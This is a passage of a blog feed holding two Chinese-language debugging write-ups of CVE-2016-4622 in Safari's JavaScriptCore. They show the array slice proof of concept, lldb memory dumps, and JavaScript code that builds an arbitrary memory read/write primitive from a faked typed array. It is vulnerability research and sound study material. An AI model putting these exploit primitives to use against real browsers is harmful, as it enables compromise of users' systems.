<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(JSC::JSArrayBufferView*)0x106c1e180&#10;(JSC::JSArrayBufferView) $0 = &#123;&#10;  JSC::JSNonFinalObject = &#123;&#10;    JSC::JSObject = &#123;&#10;      JSC::JSCell = &#123;                                   --&#62;jsCellHeader &#10;        m_structureID = 4096                            --&#62;00, 0x10, 00, 00,&#10;        m_indexingType = &#39;\0&#39;                           --&#62;0x0, &#10;        m_type = Float64ArrayType                       --&#62;0x27, &#10;        m_flags = &#39;\x18&#39;                                --&#62;0x18,&#10;        m_cellState = NewWhite                          --&#62;0x1,&#10;      &#125;&#10;      m_butterfly = &#123;&#10;        JSC::CopyBarrierBase = (m_value = 0x0000000000000006) --&#62;butterfly:false&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;  m_vector = &#123;&#10;    JSC::CopyBarrierBase = (m_value = 0x0000000106c173c0)  --&#62;vector: hax&#10;  &#125;&#10;  m_length = 16           --&#62; lengthAndFlags: (new Int64(&#39;0x0001000000000010&#39;)).asJSValue()&#10;  m_mode = 65536&#10;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03_任意内存读写">0x03 任意内存读写</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">memory = &#123;</span><br><span class="line">    read: <span class="function"><span class="keyword">function</span>(<span class="params">addr, length</span>) </span>&#123;</span><br><span class="line">        print(<span class="string">"[&lt;] Reading "</span> + length + <span class="string">" bytes from "</span> + addr);</span><br><span class="line">        fakearray[<span class="number">2</span>] = addr.asDouble();</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            a[i] = hax[i];</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    readInt64: <span class="function"><span class="keyword">function</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Int64(<span class="keyword">this</span>.read(addr, <span class="number">8</span>));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    write: <span class="function"><span class="keyword">function</span>(<span class="params">addr, data</span>) </span>&#123;</span><br><span class="line">        print(<span class="string">"[&gt;] Writing "</span> + data.length + <span class="string">" bytes to "</span> + addr);</span><br><span class="line">        fakearray[<span class="number">2</span>] = addr.asDouble();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">            hax[i] = data[i];</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    writeInt64: <span class="function"><span class="keyword">function</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.write(addr, val.bytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 --count 10 0x0000000106c1e170&#10;0x106c1e170: 0x0100150000001134 0x0000000000000000   &#10;0x106c1e180: 0x0118270000001000 0x0000000000000006   --&#62;fakearray[0],fakearray[1]&#10;0x106c1e190: 0x0000000106c173c0 0x0001000000000010   --&#62;fakearray[2],fakearray[3]&#10;0x106c1e1a0: 0x010a170000000031 0x0000000000000000&#10;0x106c1e1b0: 0x0000000106c1e1d0 0x0000000106d8bd80</span><br></pre></td></tr></table></figure>
<p>这里的<code>fakearray</code>的值就是上面的<code>0x106c1e180</code>。</p>
<p>所以<code>fakearray[2]</code>指向了<code>vector</code>，也就是<code>hax</code>。    </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#60;] Reading 8 bytes from 0x0000000106dda180&#10;Process 78730 stopped&#10;* thread #1: tid = 0x30b3dc, 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.2&#10;    frame #0: 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851&#10;   848 &#9;EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;-&#62; 851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;(lldb) memory read --format x --size 8 --count 10 0x0000000106c173c0&#10;0x106c173c0: 0x01182200000000fa 0x0000000000000000  &#60;--hax:JSCell,hax:m_butterfly&#10;0x106c173d0: 0x0000000106dda180 0x0000000100001000  &#60;--hax:vector&#22320;&#22336;&#21464;&#25104;&#20102;&#35201;&#35835;&#21462;&#30340;&#22320;&#22336;&#10;0x106c173e0: 0x0118270000001132 0x0000000105d9f0d0&#10;0x106c173f0: 0x0000000105d9f0a0 0x0000000000000001&#10;0x106c17400: 0x0118270000001131 0x0000000105d9f0a8&#10;(lldb) c&#10;Process 78730 resuming&#10;[&#62;] Writing 8 bytes to 0x0000000106c1e170&#10;Process 78730 stopped&#10;* thread #1: tid = 0x30b3dc, 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.2&#10;    frame #0: 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851&#10;   848 &#9;EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;-&#62; 851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;(lldb) memory read --format x --size 8 --count 10 0x0000000106c173c0&#10;0x106c173c0: 0x01182200000000fa 0x0000000000000000 &#60;--hax:JSCell,hax:m_butterfly&#10;0x106c173d0: 0x0000000106c1e170 0x0000000100001000 &#60;--hax:vector&#22320;&#22336;&#21464;&#25104;&#20102;&#35201;&#20889;&#20837;&#30340;&#22320;&#22336;&#10;0x106c173e0: 0x0118270000001132 0x0000000105d9f0d0&#10;0x106c173f0: 0x0000000105d9f0a0 0x0000000000000001&#10;0x106c17400: 0x0118270000001131 0x0000000105d9f0a8&#10;(lldb)</span><br></pre></td></tr></table></figure>
<h1 id="0x04_小结">0x04 小结</h1><p>本文记录了通过<code>CVE-2016-4622</code>实现任意内存读写的调试流程。是<a href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">上一篇文章</a>的延续。</p>
<p>有了任意内存读写的手段之后，下一步就是利用<code>JIT</code>调用<code>shellcode</code>了。</p>
<h1 id="引用">引用</h1><p>[1] <a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">http://phrack.org/papers/attacking_javascript_engines.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> 本文基于<a href="phrack@saelo.net">saelo</a>在 <a href="http://phrack.org">phrack</a>上发表的<a href="http://phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines</a>一文，记录了调试的过程。</p>
<p><a href="https://github.com/saelo/jscpwn">POC</a></p>
<p><a href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">CVE-2016-4622调试笔记</a>记录最基本的漏洞触发过程的调试。</p>
<p>本文记录更高级利用技巧的调试过程。</p>]]>
    
    </summary>
    
      <category term="javascrip" scheme="http://turingh.github.io/tags/javascrip/"/>
    
      <category term="safari" scheme="http://turingh.github.io/tags/safari/"/>
    
      <category term="webkit" scheme="http://turingh.github.io/tags/webkit/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4622调试笔记]]></title>
    <link href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/"/>
    <id>http://turingh.github.io/2016/12/03/CVE-2016-4622调试笔记/</id>
    <published>2016-12-03T21:23:47.000Z</published>
    <updated>2016-12-05T16:08:23.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> 本文基于<a href="phrack@saelo.net">saelo</a>在 <a href="http://phrack.org" target="_blank" rel="external">phrack</a>上发表的<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">Attacking JavaScript Engines</a>一文，记录了调试的过程。</p>
<p><a href="https://github.com/saelo/jscpwn" target="_blank" rel="external">POC</a></p>
<a id="more"></a>
<h1 id="0x01_环境搭建">0x01 环境搭建</h1><p>这个漏洞可以在<code>OS X 10.11.5</code>上的<code>safari 9.1.1</code>重现。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Setting up container object&#10;[*] Fake JSObject @ 0x000000010d81e180&#10;[*] Float64Array structure ID found: 00001000&#10;[&#60;] Reading 8 bytes from 0x000000010d9da1c0&#10;[&#62;] Writing 8 bytes to 0x000000010d81e170&#10;[&#60;] Reading 16 bytes from 0x000000010d816580&#10;[&#62;] Writing 16 bytes to 0x000000010d81e180&#10;[&#62;] Writing 8 bytes to 0x000000010d81e198&#10;[+] All done!</span><br></pre></td></tr></table></figure>
<p>但是通过<code>lldb</code>直接调试<code>safari</code>是没有<code>webkit</code>相关的调试符号的。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x0a16, 0x00007fff90f9aac0 JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*), queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.1&#10;    frame #0: 0x00007fff90f9aac0 JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*)&#10;JavaScriptCore`JSC::arrayProtoFuncSlice:&#10;-&#62;  0x7fff90f9aac0 &#60;+0&#62;: pushq  %rbp&#10;    0x7fff90f9aac1 &#60;+1&#62;: movq   %rsp, %rbp&#10;    0x7fff90f9aac4 &#60;+4&#62;: pushq  %r15&#10;    0x7fff90f9aac6 &#60;+6&#62;: pushq  %r14&#10;(lldb) p (JSC::ExecState*) $rdi&#10;error: use of undeclared identifier &#39;JSC&#39;&#10;error: expected expression</span><br></pre></td></tr></table></figure>
<p>苹果官方虽然开源了<code>JavaScriptCore</code>的代码，但是没有编译脚本。</p>
<p>在不熟悉<code>JSC</code>的情况下，想要对<code>POC</code>进行调试的话需要下载<code>webkit</code>，并编译存在相应漏洞的版本，就可以在有调试符号的情况下进行调试。具体的源码下载与编译参考<a href="https://webkit.org/building-webkit/" target="_blank" rel="external">WebKit官网的相关链接</a>。</p>
<h2 id="1-1_编译参数">1.1 编译参数</h2><p><code>Webkit</code>官方的编译脚本将所有的<code>warning</code>视为<code>error</code>，估计是我们调试漏洞的版本不是发布版本，所以存在一些<code>warning</code>会导致编译失败，我的做法是手动在配置文件中关闭这个设置。具体方法是将<code>WebKit</code>源码文件夹中所有的<code>Base.xcconfig</code>中的<code>GCC_TREAT_WARNINGS_AS_ERRORS</code>设置为<code>NO</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GCC_TREAT_WARNINGS_AS_ERRORS = NO;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_漏洞版本">1.2 漏洞版本</h2><p>将代码版本切换到<code>320b1fc</code>这个版本。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">320b1fc 2016-05-03  Geoffrey Garen  &#60;ggaren@apple.com&#62;</span><br></pre></td></tr></table></figure>
<p>切换到目标版本之后直接编译就可以了。</p>
<p>编译过程中在<code>WebCore</code>的<code>Link</code>时应该会有一个报错，修改源码处理一下就好了。</p>
<h2 id="1-3_通过JSC调试">1.3 通过JSC调试</h2><p>在<code>WebKit/WebKitBuild/Debug</code>中会有一个<code>jsc</code>，就是<code>JavaScriptCore</code>，单独调试这个<code>JavaScript</code>的引擎就会简单很多。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140;  Debug git:(CVE-2016-4622) &#10007; export DYLD_FRAMEWORK_PATH=/Users/XXX/GitHub/WebKit/WebKitBuild/Debug&#10;&#10140;  Debug git:(CVE-2016-4622) &#10007; lldb ./jsc ./poc.js&#10;(lldb) target create &#34;./jsc&#34;&#10;Current executable set to &#39;./jsc&#39; (x86_64).&#10;(lldb) settings set -- target.run-args  &#34;./poc.js&#34;&#10;(lldb) b arrayProtoFuncSlice                                                                                                                                                                                                                      Breakpoint 1: where = JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*), address = 0x00000000002a9640&#10;(lldb) r&#10;Process 55066 launched: &#39;./jsc&#39; (x86_64)&#10;1 location added to breakpoint 1&#10;Process 55066 stopped&#10;* thread #1: tid = 0x2606d6, 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 15 at ArrayPrototype.cpp:851, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.2&#10;    frame #0: 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 15 at ArrayPrototype.cpp:851&#10;   848 &#9;EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;-&#62; 851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;(lldb)</span><br></pre></td></tr></table></figure>
<p>这样就可以带符号的调试<code>JSC</code>的漏洞了。</p>
<h1 id="0x02_调试过程">0x02 调试过程</h1><h2 id="2-1_JSC漏洞">2.1 JSC漏洞</h2><p>漏洞的POC代码如下，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line">print (b);</span><br></pre></td></tr></table></figure>
<p>执行<code>poc</code>脚本后可以发现漏洞确实存在。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140;  Debug git:(CVE-2016-4622) &#10007; ./jsc ./poc.js&#10;0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0</span><br></pre></td></tr></table></figure>
<p>具体的漏洞原因在saelo的文章中已经说的很清楚了，大致流程如图所示，细节这里就不赘述了，只记录调试过程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-4622/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0.png" alt="poc触发流程"></p>
<p>通过在这三个函数下断点，分析漏洞触发流程。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b arrayProtoFuncSlice&#10;Breakpoint 1: where = JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*), address = 0x00000000002a9640&#10;(lldb) b JSArray::setLength&#10;Breakpoint 2: where = JavaScriptCore`JSC::JSArray::setLength(JSC::ExecState*, unsigned int, bool), address = 0x0000000000089170&#10;(lldb )b ArrayPrototype.cpp:861&#10;Breakpoint 3: where = JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*) + 211 at ArrayPrototype.cpp:861, address = 0x00000001003430d3</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x0000000100343040 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 64 at ArrayPrototype.cpp:852, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100343040 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 64 at ArrayPrototype.cpp:852&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;   851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;-&#62; 852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;   855 &#9;    if (exec-&#62;hadException())&#10;(lldb) p *thisObj&#10;(JSC::JSObject) $15 = &#123;&#10;  JSC::JSCell = &#123;&#10;    m_structureID = 77&#10;    m_indexingType = &#39;\a&#39;&#10;    m_type = ObjectType&#10;    m_flags = &#39;\b&#39;&#10;    m_cellState = NewWhite&#10;  &#125;&#10;  m_butterfly = &#123;&#10;    JSC::CopyBarrierBase = (m_value = 0x00000001069e4170)&#10;  &#125;&#10;&#125;&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001069e4170&#10;0x1069e4170: 0x3fbf7ced916872b0 0x3ff1f7ced916872b&#10;0x1069e4180: 0x4000fbe76c8b4396 0x4008fbe76c8b4396&#10;0x1069e4190: 0x40107df3b645a1cb 0x40147df3b645a1cb&#10;0x1069e41a0: 0x40187df3b645a1cb 0x401c7df3b645a1cb&#10;0x1069e41b0: 0x40203ef9db22d0e5 0x40223ef9db22d0e5</span><br></pre></td></tr></table></figure>
<p>通过对<code>thisObj</code>的<code>m_butterfly</code>的的内存可以看到浮点数存储在内存中相应的位置。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x0000000100343076 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 118 at ArrayPrototype.cpp:855, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100343076 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 118 at ArrayPrototype.cpp:855&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;-&#62; 855 &#9;    if (exec-&#62;hadException())&#10;   856 &#9;        return JSValue::encode(jsUndefined());&#10;   857&#10;   858 &#9;    unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);&#10;(lldb) p length&#10;(unsigned int) $17 = 100</span><br></pre></td></tr></table></figure>
<p>数组长度是<code>100</code>符合脚本执行的预期结果。</p>
<p>在执行这一行代码，获取<code>slice</code>的第二个参数时会对<code>a</code>执行<code>setLength</code>函数。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&#62; 859 &#9;    unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);</span><br></pre></td></tr></table></figure>
<p>调用栈如下，</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x26497e, 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.2&#10;    frame #0: 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397&#10;   394&#10;   395 &#9;bool JSArray::setLength(ExecState* exec, unsigned newLength, bool throwException)&#10;   396 &#9;&#123;&#10;-&#62; 397 &#9;    Butterfly* butterfly = m_butterfly.get();&#10;   398 &#9;    switch (indexingType()) &#123;&#10;   399 &#9;    case ArrayClass:&#10;   400 &#9;        if (!newLength)&#10;(lldb) bt&#10;* thread #1: tid = 0x26497e, 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.2&#10;  * frame #0: 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397&#10;    frame #1: 0x0000000100c362ef JavaScriptCore`JSC::JSArray::put(cell=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, propertyName=PropertyName @ 0x00007fff5fbfced0, value=JSValue @ 0x00007fff5fbfcec8, slot=0x00007fff5fbfcf28) + 511 at JSArray.cpp:206&#10;&#9;frame #2-#18 &#30465;&#30053;&#12290;&#12290;&#12290;&#10;    frame #19: 0x00000001003430d0 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 208 at ArrayPrototype.cpp:859</span><br></pre></td></tr></table></figure>
<p>观察<code>this</code>指针，</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *this&#10;(JSC::JSArray) $20 = &#123;&#10;  JSC::JSNonFinalObject = &#123;&#10;    JSC::JSObject = &#123;&#10;      JSC::JSCell = &#123;&#10;        m_structureID = 77&#10;        m_indexingType = &#39;\a&#39;&#10;        m_type = ObjectType&#10;        m_flags = &#39;\b&#39;&#10;        m_cellState = NewWhite&#10;      &#125;&#10;      m_butterfly = &#123;&#10;        JSC::CopyBarrierBase = (m_value = 0x00000001069e4170)&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里的<code>this</code>就是这钱的<code>thisOBj</code>也就是脚本中的<code>var a</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x0000000100c37277 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 791 at JSArray.cpp:434, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100c37277 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 791 at JSArray.cpp:434&#10;   431 &#9;        unsigned lengthToClear = butterfly-&#62;publicLength() - newLength;&#10;   432 &#9;        unsigned costToAllocateNewButterfly = 64; // a heuristic.&#10;   433 &#9;        if (lengthToClear &#62; newLength &#38;&#38; lengthToClear &#62; costToAllocateNewButterfly) &#123;&#10;-&#62; 434 &#9;            reallocateAndShrinkButterfly(exec-&#62;vm(), newLength);&#10;   435 &#9;            return true;&#10;   436 &#9;        &#125;&#10;   437</span><br></pre></td></tr></table></figure>
<p>在<code>setLength</code>里面就会触发内存的<code>Shrink</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x26497e, 0x00000001003430d3 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 211 at ArrayPrototype.cpp:861, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1&#10;    frame #0: 0x00000001003430d3 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 211 at ArrayPrototype.cpp:861&#10;   858 &#9;    unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);&#10;   859 &#9;    unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);&#10;   860&#10;-&#62; 861 &#9;    std::pair&#60;SpeciesConstructResult, JSObject*&#62; speciesResult = speciesConstructArray(exec, thisObj, end - begin);&#10;   862 &#9;    // We can only get an exception if we call some user function.&#10;   863 &#9;    if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))&#10;   864 &#9;        return JSValue::encode(jsUndefined());</span><br></pre></td></tr></table></figure>
<p><code>argumentClampedIndexFromStartOrEnd</code>执行完了之后，<code>thisObj</code>的<code>m_butterfly</code>的地址发生了变化。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(JSC::JSObject) $26 = &#123;&#10;  JSC::JSCell = &#123;&#10;    m_structureID = 77&#10;    m_indexingType = &#39;\a&#39;&#10;    m_type = ObjectType&#10;    m_flags = &#39;\b&#39;&#10;    m_cellState = NewWhite&#10;  &#125;&#10;  m_butterfly = &#123;&#10;    JSC::CopyBarrierBase = (m_value = 0x00000001069e4768)&#10;  &#125;&#10;&#125;&#10;&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001069e4768&#10;0x1069e4768: 0x3fbf7ced916872b0 0x3ff1f7ced916872b&#10;0x1069e4778: 0x0000000000000000 0x0000000000000000&#10;0x1069e4788: 0x0000000000000000 0x0000000000000000&#10;0x1069e4798: 0x0000000000000000 0x0000000000000000&#10;0x1069e47a8: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>在<code>fastSlice</code>的数据拷贝完成之后，再看一下<code>thisObj</code>的<code>m_bufferfly</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x000000010034319a JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 410 at ArrayPrototype.cpp:868, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x000000010034319a JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 410 at ArrayPrototype.cpp:868&#10;   865&#10;   866 &#9;    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &#38;&#38; isJSArray(thisObj))) &#123;&#10;   867 &#9;        if (JSArray* result = asArray(thisObj)-&#62;fastSlice(*exec, begin, end - begin))&#10;-&#62; 868 &#9;            return JSValue::encode(result);&#10;   869 &#9;    &#125;&#10;   870&#10;   871 &#9;    JSObject* result;&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001069e4768&#10;0x1069e4768: 0x3fbf7ced916872b0 0x3ff1f7ced916872b&#10;0x1069e4778: 0x0000000a0000000a 0x3fbf7ced916872b0&#10;0x1069e4788: 0x3ff1f7ced916872b 0x0000000a0000000a&#10;0x1069e4798: 0x0000000000000000 0x0000000000000000&#10;0x1069e47a8: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到拷贝到了一些奇怪的东西，读过<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">writeup</a>就会知道，这是在存储区域相邻的一个<code>object</code>的数据。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>理解了漏洞的成因之后，<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">writeup</a>中介绍更高级的利用技巧。</p>
<ul>
<li>地址泄露</li>
<li>伪造object</li>
<li>任意地址读写</li>
</ul>
